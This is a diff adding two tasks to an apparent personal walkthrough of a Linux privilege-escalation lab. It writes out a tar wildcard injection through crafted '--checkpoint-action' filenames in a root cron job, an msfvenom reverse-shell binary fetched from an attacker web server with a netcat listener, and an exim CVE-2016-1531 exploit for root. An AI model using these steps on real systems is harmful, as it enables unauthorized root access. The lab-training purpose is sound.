@@ -251,3 +251,84 @@ exit
 
 # Task 10 : Cron Jobs - Wildcards
 
+View the contents of the other cron job script:
+```
+cat /usr/local/bin/compress.sh
+```
+Note that the tar command is being run with a wildcard (*) in your home directory.
+
+Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.
+
+Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+```
+Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
+I used python webserver\
+on attacker machine : `python3 -m http.server 80` and on the VM `wget <attackerip>/shell.elf`\
+then
+```
+chmod +x /home/user/shell.elf
+```
+Create these two files in /home/user:
+```
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+```
+
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
+```
+nc -nvlp 4444
+```
+Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
+```
+rm /home/user/shell.elf
+rm /home/user/--checkpoint=1
+rm /home/user/--checkpoint-action=exec=shell.elf
+```
+
+# Task 11 : SUID / SGID Executables - Known Exploits
+
+Find all the SUID/SGID executables on the Debian VM:
+```
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+result 
+```
+-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
+-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
+-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
+-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
+-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
+-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
+-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
+-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
+-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
+-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
+-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
+-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
+-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
+-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
+-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
+-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
+-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
+-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
+-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
+-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
+-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
+-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
+-rwsr-sr-x 1 root root 926536 Sep 25 10:30 /tmp/rootbash
+-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
+-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
+```
+the *exim-4.84-3* looks interesting so search in [exploitdb](https://www.exploit-db.com)\
+search for exim-4-84.3 and download the exploit\
+make it executeable using `chmod +x cve-2016-1531.sh`\
+Run the exploit script to gain a root shell:
+```
+./cve-2016-1531.sh
+```
+There you go you goth the shell 😺
